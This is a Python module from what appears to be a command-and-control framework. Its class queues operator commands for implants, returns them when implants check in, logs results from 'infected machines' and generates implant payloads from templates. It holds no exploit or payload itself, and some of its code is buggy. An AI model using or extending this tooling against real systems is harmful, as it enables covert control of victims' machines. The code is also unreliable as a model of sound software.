import ast

from Data.Database import Database
from Implant.ImplantGenerator import ImplantGenerator

class ImplantSingleton:
    class __OnlyOne:
        # -- The Implant class is sole class responsible for controlling data to and from implants.
        # --    it manages  these interaction across all types of implants and communication protocols.

        def AddCommand(self, User, cid, UniqueImplantKey,Command):
            # AddCommand is responsible for creating new entries for implants to pickup.
            #   User validation checks must occur before a command is registered.
            db.implant.Register_ImplantCommand(User, UniqueImplantKey, Command, cid=cid)


        def IssueCommand(self,UIK=0, c2_protocol=None):
            if UIK != 0:
                # -- Issue command based on unique implant identifiers (UIK)
                # -- UIK is embedded into the implant via Jinja on delivery.

                # BUG: If the X-Header is mangled this errors.
                ImplantObj=db.implant.Get_GeneratedImplantDataFromUIK(UIK)
                # Updates an implants last check-in time.
                db.implant.Update_ImplantLastCheckIn(ImplantObj['cid'], UIK, c2_protocol)

                for implant in ImplantObj:
                    ImpLogs = db.implant.Get_RegisteredImplantCommandsFromUIK(ImplantObj['unique_implant_id'])
                    tmpImpLogs = []
                    for x in ImpLogs:
                        if x.read_by_implant == 0:
                            tmpImpLogs.append(x)
                    if len(tmpImpLogs) != 0:
                        Entry = min(tmpImpLogs, key=lambda x: x.time)
                        if db.implant.Register_ImplantCommandPickup(Entry, c2_protocol):
                            # Entry.log_entry is currently cast to a string at this stage.
                            return ast.literal_eval(Entry.log_entry)

            # -- Create a suitable null response.
            # --    This may be a random value, depending on how the implant handles it.

                return "=="
            else:
                return "=="

        # -- Used by Implant - Logs command responses from infected machines.
        def CommandResponse(self,unique_implant_key , cmd_result, c2_protocol=None):
            generated_implant_data = db.implant.Get_GeneratedImplantDataFromUIK(unique_implant_key)
            db.implant.Register_ImplantResponse(generated_implant_data['cid'],unique_implant_key,cmd_result, c2_protocol)


        # -- Used by webapp.
        def Get_CommandResult(self,cid):
            # -- This trust any calls have already been authenticated/
            # --    May need to move authentication to this level.
            return db.implant.Get_CampaignImplantResponses(cid)

        # -- Used by Implant stagers to create a suitable implant based on implant template configuration
        def GeneratePayload(self, NewSplicedImplantData):
            # -- Refactor code: variable names + checks on types.
            ImpGen = ImplantGenerator()
            if len(NewSplicedImplantData) == 1:
                NewSplicedImplantData = NewSplicedImplantData[0]
            rendered_implant = ImpGen.generate_implant_from_template(NewSplicedImplantData)
            db.implant.Set_GeneratedImplantCopy(NewSplicedImplantData, rendered_implant)
            return rendered_implant

        # TODO:
        # create functions for all listener/webapp/stager actions to avoid direct DB queries from ImplantManager, HttpListener/HttpsListener etc

        # Register implant submit stager key ( implant template returns a unique implant id aka unique implant key )
        # Implant check in: UII/UIK + protocol checkin occured over



    instance = None
    def __init__(self):
        if not ImplantSingleton.instance:
            ImplantSingleton.instance = ImplantSingleton.__OnlyOne()
        else:
            ImplantSingleton.instance.val = arg

db = Database()
ImplantSingleton() # Create Singleton
